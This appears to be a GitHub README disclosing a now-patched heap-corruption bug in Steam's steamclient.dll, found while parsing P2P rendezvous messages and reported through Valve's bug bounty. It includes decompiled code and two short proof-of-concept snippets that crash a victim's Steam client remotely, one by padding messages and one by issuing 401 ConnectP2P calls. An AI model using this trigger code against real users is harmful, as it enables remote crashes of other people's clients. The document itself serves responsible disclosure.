# CrashSteamUser
**PoC Code for Steam Bug Bounty, Allowing P2P Connections to Crash Clients, submitted to Valve's bug bounty program under "#1276762
Improper memory buffer size calculation causes heap corruption in steamclient.dll CMsgSteamNetworkingP2PRendezvous signal parse"**

*Valve Quickly Responded to, and Patched this bug within a month of initial reporting. Funds were awarded under their bug bounty program. HackerOne disclosure deadline has elapsed, allowing for the discussion of this bug*

## Technical Background 

Valve provides native P2P networking capabilities within [Steam GameNetworkingSockets](https://github.com/ValveSoftware/GameNetworkingSockets), avaliable for use to game developers through the [Steamworks API](https://partner.steamgames.com/doc/sdk).

To begin a P2P session, GameNetworkingSockets generates a CMsgSteamNetworkingP2PRendezvous protobuf message in [SetRendezvousCommonFieldsAndSetSignals](https://github.com/ValveSoftware/GameNetworkingSockets/blob/d5f855967440eeb5b4d5798bebe179ef868ac6af/src/steamnetworkingsockets/clientlib/steamnetworkingsockets_p2p.cpp#LL1599C34-L1599C72). This message is then transmitted to the targeted client, who will then initiate a worker thread for a CClientJobConnectionInfo message, containing the Rendezvous found within a CMsgClientP2PConnectionInfo message.

## The Bug

The following disassembled representation of a function within steamclient.dll: 
```C
    nByteSize = CalculateByteSize(&P2PRendezvous);
    nSizeReturn = nByteSize;
    nSizeOfAllocedMemory = 8208;
    if ( nByteSize > 8192 )
    {
      nSizeOfAllocedMemory = 16400 - nByteSize; //nSizeOfAllocedMemory now becomes very small
    }
    allocedMemory = (*(int (__stdcall **)(int))(*g_pMemAllocSteam + 12))(nSizeOfAllocedMemory); // malloc
    v17 = *(_DWORD *)(ContainsappID + 24);
    *(_DWORD *)(allocedMemory + 4) = *(_DWORD *)(ContainsappID + 28);
    *(_DWORD *)allocedMemory = v17;
    *(_DWORD *)(allocedMemory + 8) = v30;
    *(_DWORD *)(allocedMemory + 12) = nSizeReturn;
    SerializeMessage(&P2PRendezvous, (_BYTE *)(allocedMemory + 16));
```

A improper calculation occurs in steamclient.dll. When a Rendezvous message is received, it is deseralized and placed within a CMsgClientP2PConnectionInfo protobuf. When calling into the signal parser, it is then seralized to an allocated memory buffer. 

The byte size of the total message is calculated and used to allocate a buffer of appropriate size. However, the value is checked to be greater than 8192 bytes,if it is found to be so, the new allocated memory size is set to 16400 - the total size. 

This causes any messages larger than 8192 to allocate a buffer of insuffecient size. ` (16400 - 16 /*hdr*/) - 8193 = 8191`, leading to heap corruption. 

In order to trigger this bug, reliable messages were appended in PoC code to fill the message size to greater than 8192 bytes.

```C++    
CMsgSteamNetworkingP2PRendezvous* pMsg = reinterpret_cast<CMsgSteamNetworkingP2PRendezvous*>(msg);
while (pMsg->ByteSize() < 8192)
{
    pMsg->add_reliable_messages();
}
 ```
 
Additionally, due to the nature of SetRendezvousCommonFieldsAndSendSignal automatically adding reliable messages that haven't been ack'd to the message (m_vecUnackedOutboundMessages), simply rapidly calling ISteamNetworkingSockets::ConnectP2P in rapid succession is enough to trigger the bug

The following code worked every attempt:

```C++
for (int i = 0; i < 401; i++)
{
	hConn[i] = Globals::g_pSteamNetworkingSockets->ConnectP2P(VictimNetworkingIdentity, i, 0, 0);
}
```



## Video Presentation
 [![Proof Of Concept video](https://img.youtube.com/vi/huNZtW7w9p8/0.jpg)](https://www.youtube.com/watch?v=huNZtW7w9p8)
